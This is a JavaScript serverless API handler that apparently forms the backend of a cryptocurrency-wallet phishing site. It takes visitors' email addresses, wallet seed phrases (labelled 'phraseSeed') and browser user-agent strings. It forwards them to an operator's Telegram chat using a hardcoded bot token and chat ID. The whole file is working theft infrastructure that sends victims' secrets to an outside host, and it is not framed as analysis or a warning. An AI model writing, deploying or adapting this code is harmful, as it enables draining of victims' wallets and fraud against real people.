// api/notify.js
export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, phraseSeed, description, type } = req.body;

    // 🔥 HARDCODED CREDENTIALS
    const TELEGRAM_BOT_TOKEN = "8786682796:AAFKWkeCO_sBxXlnrn7dWwXgRz8G2zX3fs0";
    const TELEGRAM_CHAT_ID = "5995903013";

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Missing Telegram credentials');
        return res.status(500).json({ error: 'Server config error' });
    }

    let message = '';
    if (type === 'visit') {
        // ✅ Use description for visits
        message = `🔔 New Visitor!\nAgent: ${description || 'Unknown'}`;
    } else if (type === 'login') {
        // ✅ Use phraseSeed for login
        message = `🔐 New Login Attempt!\nEmail: ${email}\nPhraseSeed: ${phraseSeed || 'No phrase seed provided'}`;
    } else {
        // Fallback
        message = `📩 Notification\nEmail: ${email}\nPhraseSeed: ${phraseSeed || description || 'Unknown'}`;
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            }),
        });

        const data = await response.json();

        if (!response.ok) {
            console.error('Telegram API error:', data);
            return res.status(500).json({ error: 'Telegram API failed: ' + JSON.stringify(data) });
        }

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ error: 'Internal server error: ' + error.message });
    }
}
